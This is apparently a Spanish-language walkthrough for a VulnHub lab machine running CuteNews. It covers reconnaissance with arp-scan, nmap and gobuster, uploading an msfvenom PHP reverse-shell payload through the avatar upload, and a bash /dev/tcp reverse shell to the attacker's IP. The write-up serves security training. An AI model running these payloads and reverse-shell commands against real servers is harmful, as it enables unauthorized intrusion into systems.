# Explotación de vulnerabilidad File Upload

Vamos a ver cómo podemos generar un payload en php que podamos subir al servidor y así obtener acceso a la máquina víctima. Para ello, vamos a acceder a un servidor FTP como Anonymous, que será donde subamos nuestro payload y adquirir esa intrusión al servidor.

Enlace a la máquina vulnerable:

[https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141](https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141)

* Hacer reconocimiento de la red para encontrar la máquina objetiva:

```bash
└─# arp-scan -I eth0 --localnet                                         
Interface: eth0, type: EN10MB, MAC: 08:00:27:ba:28:e1, IPv4: 192.168.1.18
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	a8:9a:93:66:15:50	(Unknown)
192.168.1.15	f4:7b:09:52:3d:48	(Unknown)
192.168.1.36	08:00:27:28:82:7e	(Unknown)
192.168.1.13	fe:d5:2d:56:5a:08	(Unknown: locally administered)
192.168.1.12	1c:98:c1:ab:90:69	(Unknown)
192.168.1.11	d8:1e:dd:32:a2:9d	(Unknown)
192.168.1.28	74:40:be:9e:eb:4a	(Unknown)

7 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.108 seconds (121.44 hosts/sec). 7 responded
```

* Ver si tenemos conectividad con la máquina objetiva:

```bash
└─# ping -c 1 192.168.1.36
PING 192.168.1.36 (192.168.1.36) 56(84) bytes of data.
64 bytes from 192.168.1.36: icmp_seq=1 ttl=64 time=3.11 ms

--- 192.168.1.36 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.111/3.111/3.111/0.000 ms
```

* Escanear los puertos de la máquina objetivo:

```bash
└─# nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.1.36
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 22:13 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
Initiating ARP Ping Scan at 22:13
Scanning 192.168.1.36 [1 port]
Completed ARP Ping Scan at 22:13, 0.21s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:13
Scanning 192.168.1.36 [65535 ports]
SYN Stealth Scan Timing: About 50.00% done; ETC: 22:14 (0:00:33 remaining)
Discovered open port 80/tcp on 192.168.1.36
Completed SYN Stealth Scan at 22:14, 69.22s elapsed (65535 total ports)
Initiating Service scan at 22:14
Scanning 1 service on 192.168.1.36
Completed Service scan at 22:14, 6.17s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.1.36.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.40s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.08s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.02s elapsed
Nmap scan report for 192.168.1.36
Host is up, received arp-response (0.00080s latency).
Scanned at 2024-10-29 22:13:07 CET for 76s
Not shown: 53055 filtered tcp ports (no-response), 12479 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Please Login / CuteNews
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 08:00:27:28:82:7E (Oracle VirtualBox virtual NIC)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.10 seconds
           Raw packets sent: 124833 (5.493MB) | Rcvd: 12483 (499.320KB)
```

Registrarse en la página web [register](http://192.168.1.36/?register).

En la parte de personal options tenemos la posibilidad de subir un archivo donde puede ser vulnerable a file upload a través un archivo php para entrar en la máquina objetivo.

* Crear archivo php con msfvenom:

```bash
└─# msfvenom -p php/reverse_php LHOST=192.168.1.18 LPORT=1717 -f raw > rs.php                                            
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2995 bytes
```

* Subimos el archivo en la sección del avatar y con gobuster buscamos directorios en el servidor web:

```bash
└─# gobuster dir -u http://192.168.1.36/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.36/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 301) [Size: 310] [--> http://192.168.1.36/docs/]
/uploads              (Status: 301) [Size: 313] [--> http://192.168.1.36/uploads/]
/skins                (Status: 301) [Size: 311] [--> http://192.168.1.36/skins/]
/core                 (Status: 301) [Size: 310] [--> http://192.168.1.36/core/]
/cdata                (Status: 301) [Size: 311] [--> http://192.168.1.36/cdata/]
/server-status        (Status: 403) [Size: 292]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

* Encontramos el directorio uploads donde esta subido nuestro archivo entonces nos ponemos en escucha con netcat:

```bash
└─$ nc -lvnp 1717
listening on [any] 1717 ...
```

* Abrimos o mandamos una petición a [uploads](http://192.168.1.36/uploads/avatar_red_rs.php):

```bash
└─$ curl http://192.168.1.36/uploads/avatar_red_rs.php
```

* Y recibimos la reverse-shell pero la conexion no es muy estable y al momento se cierra entonces enviaremos otra reverse-shell por otro puerto desde otra terminal:

```bash
└─$ nc -lvnp 1717
listening on [any] 1717 ...
connect to [192.168.1.18] from (UNKNOWN) [192.168.1.36] 54394
hostname
simple
```

* Escuchar en otro puerto en otra terminal:

```bash
└─$ nc -lvnp 7777
listening on [any] 7777 ...
```

* Enviar reverse-shell:

```bash
└─$ nc -lvnp 1717
listening on [any] 1717 ...
connect to [192.168.1.18] from (UNKNOWN) [192.168.1.36] 54394
hostname
simple

bash -c "bash -i >& /dev/tcp/192.168.1.18/7777 0>&1"
```

* Recibir la reverse-shell:

```bash
└─$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [192.168.1.18] from (UNKNOWN) [192.168.1.36] 45708
bash: cannot set terminal process group (1068): Inappropriate ioctl for device
bash: no job control in this shell
www-data@simple:/var/www/html/uploads$ hostname
hostname
simple
www-data@simple:/var/www/html/uploads$ 
```
